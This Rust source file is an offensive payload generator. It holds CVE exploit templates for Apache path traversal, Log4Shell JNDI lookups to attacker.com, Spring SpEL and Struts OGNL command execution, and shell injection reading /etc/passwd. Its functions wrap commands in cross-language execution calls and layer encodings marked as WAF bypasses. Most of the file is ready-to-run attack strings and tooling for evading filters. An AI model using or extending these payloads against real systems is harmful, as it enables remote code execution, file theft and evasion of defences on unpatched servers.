//! Automated multi-language, multi-encoding payload generator for zero-day and CVE-driven scanning.

use base64::Engine;
use serde::{Deserialize, Serialize};

/// Supported target languages/frameworks for payload generation.
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub enum TargetLang {
    PHP, Python, NodeJs, Java, Ruby, Go, Rust, CSharp, Perl, Lua, Bash,
    JSP, ASP, ASPNet, Django, Flask, SpringBoot, Laravel, WordPress, Drupal, Generic,
}

/// Supported encoding/obfuscation layers.
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub enum EncodingLayer {
    None, UrlEncode, UrlDoubleEncode, HtmlEntity, HtmlDecimal, HexEncode, UnicodeEscape,
    Base64, MixedCase, InlineComment, NullByteTruncation, WhitespacePadding,
}

/// Database engine for SQLi payload adaptation.
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub enum Dbms {
    MySQL, MSSQL, PostgreSQL, Oracle, SQLite, Redis, MongoDB, Cassandra, Generic,
}

/// Generated payload with metadata.
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub struct GeneratedPayload {
    pub raw: String,
    pub encoding_layers: Vec<EncodingLayer>,
    pub dbms: Dbms,
    pub technique: String,
    pub waf_bypass: bool,
    pub stage: usize,
}

/// CVE-aware payload template matching known exploit patterns.
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct CvePayloadTemplate {
    pub cve_id: String,
    pub name: String,
    pub affected_component: String,
    pub technique: String,
    pub description: String,
    pub payload_stages: Vec<Vec<String>>,
    pub target_langs: Vec<TargetLang>,
    pub severity: String,
    pub cvss_score: Option<f32>,
    pub tags: Vec<String>,
}

/// Returns CVE payload templates as a `Vec` (avoids const allocation restrictions).
pub fn get_all_cve_templates() -> Vec<CvePayloadTemplate> {
    vec![
        CvePayloadTemplate {
            cve_id: "CVE-2021-41773".into(),
            name: "Apache 2.4.49 Path Traversal".into(),
            affected_component: "Apache HTTP Server".into(),
            technique: "path_traversal".into(),
            description: "Apache 2.4.49 path traversal allowing file read via encoded path segments".into(),
            payload_stages: vec![
                vec!["/cgi-bin/.%2e/.%2e/.%2e/etc/passwd".into(), "/icons/.%2e/%2f/etc/passwd".into()],
                vec!["..%2f..%2f..%2fetc/passwd".into(), "....//....//....//etc/passwd".into()],
            ],
            target_langs: vec![TargetLang::Generic],
            severity: "Critical".into(),
            cvss_score: Some(7.5),
            tags: vec!["path-traversal".into(), "apache".into(), "cve-2021-41773".into()],
        },
        CvePayloadTemplate {
            cve_id: "CVE-2021-42013".into(),
            name: "Apache 2.4.50 Path Traversal".into(),
            affected_component: "Apache HTTP Server".into(),
            technique: "path_traversal".into(),
            description: "Apache 2.4.50 path traversal bypass of CVE-2021-41773 patch".into(),
            payload_stages: vec![
                vec!["/cgi-bin/..%2f..%2f..%2fetc/passwd".into()],
                vec!["/icons/..%2f..%2f..%2fetc/passwd".into()],
            ],
            target_langs: vec![TargetLang::Generic],
            severity: "Critical".into(),
            cvss_score: Some(9.8),
            tags: vec!["path-traversal".into(), "apache".into(), "cve-2021-42013".into()],
        },
        CvePayloadTemplate {
            cve_id: "CVE-2022-22965".into(),
            name: "Spring4Shell".into(),
            affected_component: "Spring Framework".into(),
            technique: "ssti".into(),
            description: "Spring4Shell - SpEL injection in Spring v4.3.18+".into(),
            payload_stages: vec![
                vec!["class.classLoader.resources.context.parent.privateMap.entry[\\'tomcat.cat\\'].name".into()],
                vec!["T(java.lang.Runtime).getRuntime().exec('id')".into()],
            ],
            target_langs: vec![TargetLang::Java, TargetLang::SpringBoot],
            severity: "Critical".into(),
            cvss_score: Some(9.8),
            tags: vec!["rce".into(), "spring".into(), "spel".into(), "cve-2022-22965".into()],
        },
        CvePayloadTemplate {
            cve_id: "CVE-2021-44228".into(),
            name: "Log4Shell".into(),
            affected_component: "Apache Log4j".into(),
            technique: "command_injection".into(),
            description: "JNDI lookup injection via ${jndi:ldap://} in log4j interpolation".into(),
            payload_stages: vec![
                vec!["${jndi:ldap://attacker.com/a}".into(), "${jndi:rmi://attacker.com/a}".into()],
                vec!["${${lower:j}ndi:${lower:l}dap://attacker.com/${lower:a}}".into()],
                vec!["${jndi:ldap://attacker.com/${upper:a}}${lower:${upper:j}ndi}".into()],
            ],
            target_langs: vec![TargetLang::Java, TargetLang::Generic],
            severity: "Critical".into(),
            cvss_score: Some(10.0),
            tags: vec!["rce".into(), "jndi".into(), "ldap".into(), "java".into(), "cve-2021-44228".into()],
        },
        CvePayloadTemplate {
            cve_id: "CVE-2022-22963".into(),
            name: "Spring Cloud Function SpEL".into(),
            affected_component: "Spring Cloud Function".into(),
            technique: "ssti".into(),
            description: "Spring Cloud Function SpEL injection via class path wildcard headers".into(),
            payload_stages: vec![
                vec!["T(java.lang.Runtime).getRuntime().exec('id')".into()],
                vec!["new java.lang.ProcessBuilder(new java.lang.String[]{{'id'}}).start()".into()],
            ],
            target_langs: vec![TargetLang::Java, TargetLang::SpringBoot],
            severity: "Critical".into(),
            cvss_score: Some(9.8),
            tags: vec!["rce".into(), "spring".into(), "spel".into(), "cve-2022-22963".into()],
        },
        CvePayloadTemplate {
            cve_id: "CVE-2017-12611".into(),
            name: "Apache Struts OGNL".into(),
            affected_component: "Apache Struts".into(),
            technique: "ssti".into(),
            description: "OGNL expression injection in Struts2 dev mode".into(),
            payload_stages: vec![
                vec!["%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):(#context.setMemberAccess(#dm))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).#p.redirectErrorStream(true).#process=#p.start().(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).#ros.flush()}}".into()],
            ],
            target_langs: vec![TargetLang::Java],
            severity: "Critical".into(),
            cvss_score: Some(10.0),
            tags: vec!["rce".into(), "struts".into(), "ognl".into(), "cve-2017-12611".into()],
        },
        CvePayloadTemplate {
            cve_id: "CVE-2021-3156".into(),
            name: "Baron Samedit".into(),
            affected_component: "sudo".into(),
            technique: "command_injection".into(),
            description: "Baron Samedit - sudo heap overflow allowing privilege escalation".into(),
            payload_stages: vec![
                vec!["sudoedit -S /etc/sudoers".into(), "-s /etc/sudoers".into()],
            ],
            target_langs: vec![TargetLang::Generic],
            severity: "Critical".into(),
            cvss_score: Some(7.8),
            tags: vec!["privilege-escalation".into(), "sudo".into(), "cve-2021-3156".into()],
        },
        CvePayloadTemplate {
            cve_id: "CVE-2023-3400".into(),
            name: "Palo Alto GlobalProtect".into(),
            affected_component: "Palo Alto GlobalProtect".into(),
            technique: "command_injection".into(),
            description: "Command injection in GlobalProtect management interface".into(),
            payload_stages: vec![
                vec!["; cat /etc/passwd".into(), "| cat /etc/passwd".into()],
                vec!["$(cat /etc/passwd)".into(), "`cat /etc/passwd`".into()],
            ],
            target_langs: vec![TargetLang::Generic],
            severity: "Critical".into(),
            cvss_score: Some(10.0),
            tags: vec!["rce".into(), "globalprotect".into(), "cve-2023-3400".into()],
        },
    ]
}

/// Looks up CVE payload templates by CVE ID.
pub fn get_cve_templates(cve_id: &str) -> Option<CvePayloadTemplate> {
    get_all_cve_templates().into_iter().find(|t| t.cve_id == cve_id)
}

/// Encodes a raw payload string according to a specified encoding layer.
pub fn apply_encoding(raw: &str, layer: &EncodingLayer) -> String {
    match layer {
        EncodingLayer::None => raw.to_string(),
        EncodingLayer::UrlEncode => urlencoding::encode(raw).to_string(),
        EncodingLayer::UrlDoubleEncode => {
            let first = urlencoding::encode(raw);
            urlencoding::encode(&first).to_string()
        }
        EncodingLayer::HtmlEntity => {
            raw.chars().map(|c| format!("&#{};", c as u32)).collect()
        }
        EncodingLayer::HtmlDecimal => {
            raw.chars().map(|c| format!("&#x{:x};", c as u32)).collect()
        }
        EncodingLayer::HexEncode => {
            raw.chars()
                .map(|c| format!("%{:02x}", c as u8))
                .collect()
        }
        EncodingLayer::UnicodeEscape => {
            raw.chars()
                .map(|c| if (c as u32) > 127 { format!("\\u{:04x}", c as u32) } else { c.to_string() })
                .collect()
        }
        EncodingLayer::Base64 => {
            base64::engine::general_purpose::STANDARD.encode(raw.as_bytes())
        }
        EncodingLayer::MixedCase => {
            raw.chars()
                .enumerate()
                .map(|(i, c)| if i % 2 == 0 { c.to_uppercase().collect::<String>() } else { c.to_lowercase().collect::<String>() })
                .collect()
        }
        EncodingLayer::InlineComment => {
            raw.chars()
                .map(|c| if c.is_alphanumeric() { c.to_string() } else { format!("{}/**/", c) })
                .collect()
        }
        EncodingLayer::NullByteTruncation => format!("{}\0", raw),
        EncodingLayer::WhitespacePadding => {
            let pads = [" ", "\t", "\r", "\n", "  ", "\t\t"];
            raw.chars()
                .map(|c| { let pad = pads[(c as usize) % pads.len()]; format!("{}{}", pad, c) })
                .collect()
        }
    }
}

/// Generates all encoding variants of a raw payload.
pub fn generate_all_encodings(raw: &str) -> Vec<GeneratedPayload> {
    let layers = vec![
        EncodingLayer::None, EncodingLayer::UrlEncode, EncodingLayer::UrlDoubleEncode,
        EncodingLayer::HtmlEntity, EncodingLayer::HtmlDecimal, EncodingLayer::HexEncode,
        EncodingLayer::UnicodeEscape, EncodingLayer::Base64, EncodingLayer::MixedCase,
        EncodingLayer::InlineComment, EncodingLayer::NullByteTruncation, EncodingLayer::WhitespacePadding,
    ];

    layers.into_iter().map(|layer| GeneratedPayload {
        raw: apply_encoding(raw, &layer),
        encoding_layers: vec![layer],
        dbms: Dbms::Generic,
        technique: "encoding".into(),
        waf_bypass: true,
        stage: 1,
    }).collect()
}

/// Generates cross-language variants of a payload concept.
pub fn generate_cross_language_payloads(concept: &str) -> Vec<GeneratedPayload> {
    let mut results = Vec::new();
    results.push(GeneratedPayload {
        raw: format!("<?php {} ?>", concept), encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: false, stage: 1,
    });
    results.push(GeneratedPayload {
        raw: format!("__import__('os').system('{}')", concept), encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: true, stage: 1,
    });
    results.push(GeneratedPayload {
        raw: format!("require('child_process').execSync('{}')", concept), encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: true, stage: 1,
    });
    results.push(GeneratedPayload {
        raw: format!("Runtime.getRuntime().exec(\"{}\")", concept), encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: true, stage: 1,
    });
    results.push(GeneratedPayload {
        raw: format!("system(\"{}\")", concept), encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: true, stage: 1,
    });
    results.push(GeneratedPayload {
        raw: format!("`{}`", concept), encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic, technique: "cross-language".into(), waf_bypass: false, stage: 1,
    });
    results
}

/// Generates WAF bypass variants of a payload.
pub fn generate_waf_bypass_variants(payload: &str) -> Vec<GeneratedPayload> {
    let mut variants = Vec::new();

    for layer in &[
        EncodingLayer::InlineComment, EncodingLayer::MixedCase, EncodingLayer::NullByteTruncation,
        EncodingLayer::WhitespacePadding, EncodingLayer::UrlEncode, EncodingLayer::UrlDoubleEncode,
        EncodingLayer::HtmlEntity, EncodingLayer::HexEncode,
    ] {
        variants.push(GeneratedPayload {
            raw: apply_encoding(payload, layer),
            encoding_layers: vec![layer.clone()],
            dbms: Dbms::Generic,
            technique: "waf-bypass".into(),
            waf_bypass: true,
            stage: 1,
        });
    }
    variants
}

/// Generates a full CVE-aware attack chain from a CVE template.
pub fn generate_cve_attack_chain(template: &CvePayloadTemplate) -> Vec<GeneratedPayload> {
    let mut chain = Vec::new();

    for (stage_idx, stage_payloads) in template.payload_stages.iter().enumerate() {
        for payload in stage_payloads {
            let mut encodings = generate_all_encodings(payload);
            let mut waf_bypass = generate_waf_bypass_variants(payload);
            for p in encodings.iter_mut() { p.stage = stage_idx + 1; p.technique = template.technique.clone(); }
            for p in waf_bypass.iter_mut() { p.stage = stage_idx + 1; p.technique = format!("{}-waf-bypass", template.technique); }
            chain.extend(encodings);
            chain.extend(waf_bypass);
        }
    }
    chain
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_url_encoding_layer() {
        let encoded = apply_encoding("alert(1)", &EncodingLayer::UrlEncode);
        assert!(encoded.contains("%28") && encoded.contains("%29"));
    }

    #[test]
    fn test_cve_template_lookup() {
        let template = get_cve_templates("CVE-2021-41773");
        assert!(template.is_some());
        if let Some(t) = template {
            assert_eq!(t.severity, "Critical");
        }
    }

    #[test]
    fn test_cve_attack_chain() {
        let template = get_cve_templates("CVE-2021-44228");
        assert!(template.is_some());
        if let Some(t) = template {
            let chain = generate_cve_attack_chain(&t);
            assert!(chain.len() > 10);
        }
    }
}